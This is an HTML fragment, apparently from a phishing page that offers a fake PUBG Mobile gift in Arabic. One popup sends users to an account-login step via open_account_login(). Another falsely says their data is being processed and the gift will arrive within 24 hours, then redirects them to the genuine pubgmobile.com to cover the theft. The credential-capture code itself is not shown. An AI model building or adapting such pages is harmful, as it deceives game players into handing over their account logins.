...
<div class="nav-popup-title">تأكيد الهدية</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">هل متأكد من الحصول علي ؟</div> <!--- popup-alert --->
...
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">تأكيد</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<div class="popup-box-bg">
<div class="popup-alert">
✅ تتم معالجة البيانات الأن

نتمني انك قمت بكتابه بياناتك بشكل صحيح ♻️ 
🕗 سيتم ارسال الهدية خلال ٢٤ ساعه
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://pubgmobile.com';">خروج</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
